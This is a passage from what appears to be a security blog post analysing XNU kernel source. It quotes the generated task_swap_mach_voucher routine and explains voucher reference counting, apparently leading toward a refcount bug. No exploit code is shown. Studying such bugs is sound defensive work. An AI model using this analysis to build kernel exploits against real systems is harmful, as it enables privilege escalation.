    &lt;span class=&quot;mi&quot;&gt;4730&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 
    &lt;span class=&quot;mi&quot;&gt;4731&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;	&lt;span class=&quot;n&quot;&gt;__MigTypeCheck&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;4732&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 	&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;In0P&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;old_voucher&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;type&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;MACH_MSG_PORT_DESCRIPTOR&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;||&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;4733&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 	    &lt;span class=&quot;n&quot;&gt;In0P&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;old_voucher&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;disposition&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;17&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;4734&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 		&lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;MIG_TYPE_ERROR&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;4735&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;endif&lt;/span&gt;	&lt;span class=&quot;cm&quot;&gt;/* __MigTypeCheck */&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;4736&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 
    &lt;span class=&quot;mi&quot;&gt;4737&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 	&lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;MACH_MSG_SUCCESS&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;4738&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;And the actual implementation can be found just below it.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-c&quot; data-lang=&quot;c&quot;&gt;    &lt;span class=&quot;nl&quot;&gt;File:&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;BUILD&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;obj&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;RELEASE_X86_64&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;osfmk&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;RELEASE&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;mach&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;task_server&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;c&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;4744&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;cm&quot;&gt;/* Routine task_swap_mach_voucher */&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;4745&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;mig_internal&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;novalue&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;_Xtask_swap_mach_voucher&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;4746&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 	&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;mach_msg_header_t&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;InHeadP&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;mach_msg_header_t&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;OutHeadP&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;4747&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;4748&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 
    &lt;span class=&quot;mi&quot;&gt;4749&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ifdef&lt;/span&gt;  &lt;span class=&quot;n&quot;&gt;__MigPackStructs&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;4750&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pragma&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pack&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;4751&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;endif&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;4752&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 	&lt;span class=&quot;k&quot;&gt;typedef&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;4753&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 		&lt;span class=&quot;n&quot;&gt;mach_msg_header_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Head&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;4754&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 		&lt;span class=&quot;cm&quot;&gt;/* start of the kernel processed data */&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;4755&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 		&lt;span class=&quot;n&quot;&gt;mach_msg_body_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;msgh_body&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;4756&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 		&lt;span class=&quot;n&quot;&gt;mach_msg_port_descriptor_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;new_voucher&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;4757&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 		&lt;span class=&quot;n&quot;&gt;mach_msg_port_descriptor_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;old_voucher&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;4758&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 		&lt;span class=&quot;cm&quot;&gt;/* end of the kernel processed data */&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;4759&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 		&lt;span class=&quot;n&quot;&gt;mach_msg_trailer_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;trailer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;4760&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 	&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Request&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;__attribute__&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;unused&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;4761&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ifdef&lt;/span&gt;  &lt;span class=&quot;n&quot;&gt;__MigPackStructs&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;4762&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pragma&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pack&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;4763&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;endif&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;4764&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 	&lt;span class=&quot;k&quot;&gt;typedef&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;__Request__task_swap_mach_voucher_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;__Request&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;4765&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 	&lt;span class=&quot;k&quot;&gt;typedef&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;__Reply__task_swap_mach_voucher_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Reply&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;__attribute__&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;unused&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;4766&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 
    &lt;span class=&quot;mi&quot;&gt;4767&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 	&lt;span class=&quot;cm&quot;&gt;/*
    4768: 	 * typedef struct {
    4769: 	 * 	mach_msg_header_t Head;
    4770: 	 * 	NDR_record_t NDR;
    4771: 	 * 	kern_return_t RetCode;
    4772: 	 * } mig_reply_error_t;
    4773: 	 */&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;4774&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Here is the stripped out implementation, with the interesting functions marked in bold.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-c&quot; data-lang=&quot;c&quot;&gt;&lt;span class=&quot;cm&quot;&gt;/* Routine task_swap_mach_voucher */&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;mig_internal&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;novalue&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;_Xtask_swap_mach_voucher&lt;/span&gt;
	&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;mach_msg_header_t&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;InHeadP&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;mach_msg_header_t&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;OutHeadP&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;

&lt;span class=&quot;o&quot;&gt;-----------------------------&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;-----------------------------&lt;/span&gt;
&lt;span class=&quot;cp&quot;&gt;#endif
&lt;/span&gt;	&lt;span class=&quot;n&quot;&gt;OutP&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;old_voucher&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pad2&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;OutP&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;old_voucher&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;type&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;MACH_MSG_PORT_DESCRIPTOR&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;cp&quot;&gt;#if defined(KERNEL)
&lt;/span&gt;	&lt;span class=&quot;n&quot;&gt;OutP&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;old_voucher&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pad_end&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;cp&quot;&gt;#endif
#endif	&lt;/span&gt;&lt;span class=&quot;cm&quot;&gt;/* UseStaticTemplates */&lt;/span&gt;&lt;span class=&quot;cp&quot;&gt;
&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;task&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;convert_port_to_task&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;In0P&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Head&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;msgh_request_port&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;

	&lt;span class=&quot;n&quot;&gt;new_voucher&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;**&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;convert_port_to_voucher&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;In0P&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;new_voucher&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;**&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

	&lt;span class=&quot;n&quot;&gt;old_voucher&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;**&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;convert_port_to_voucher&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;In0P&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;old_voucher&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;**&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

	&lt;span class=&quot;n&quot;&gt;RetCode&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;**&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;task_swap_mach_voucher&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;task&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;new_voucher&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;old_voucher&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;**&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
	&lt;span class=&quot;o&quot;&gt;**&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ipc_voucher_release&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;new_voucher&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;**&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;task_deallocate&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;task&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
	&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;RetCode&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;KERN_SUCCESS&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
		&lt;span class=&quot;n&quot;&gt;MIG_RETURN_ERROR&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;OutP&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;RetCode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
	&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;cp&quot;&gt;#if	__MigKernelSpecificCode
&lt;/span&gt;
	&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;IP_VALID&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ipc_port_t&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;In0P&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;old_voucher&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
		&lt;span class=&quot;n&quot;&gt;ipc_port_release_send&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ipc_port_t&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;In0P&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;old_voucher&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;

	&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;IP_VALID&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ipc_port_t&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;In0P&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;new_voucher&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
		&lt;span class=&quot;n&quot;&gt;ipc_port_release_send&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ipc_port_t&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;In0P&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;new_voucher&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;cp&quot;&gt;#endif &lt;/span&gt;&lt;span class=&quot;cm&quot;&gt;/* __MigKernelSpecificCode */&lt;/span&gt;&lt;span class=&quot;cp&quot;&gt;
&lt;/span&gt;	&lt;span class=&quot;n&quot;&gt;OutP&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;old_voucher&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;name&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;mach_port_t&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;**&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;convert_voucher_to_port&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;old_voucher&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;**&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

	&lt;span class=&quot;n&quot;&gt;OutP&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Head&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;msgh_bits&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;|=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;MACH_MSGH_BITS_COMPLEX&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;OutP&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Head&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;msgh_size&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;mach_msg_size_t&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;sizeof&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Reply&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;OutP&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;msgh_body&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;msgh_descriptor_count&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;__AfterRcvRpc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;3441&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;task_swap_mach_voucher&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;The function &lt;strong&gt;convert_port_to_voucher&lt;/strong&gt; increases the reference count by one by calling &lt;strong&gt;ipc_voucher_reference&lt;/strong&gt;.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-c&quot; data-lang=&quot;c&quot;&gt;    &lt;span class=&quot;nl&quot;&gt;File:&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;osfmk&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ipc&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ipc_voucher&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;c&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;386&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;cm&quot;&gt;/*
    387:  *	Routine:	convert_port_to_voucher
    388:  *	Purpose:
    389:  *		Convert from a port to a voucher.
    390:  *		Doesn't consume the port [send-right] ref;
    391:  *		produces a voucher ref,	which may be null.
    392:  *	Conditions:
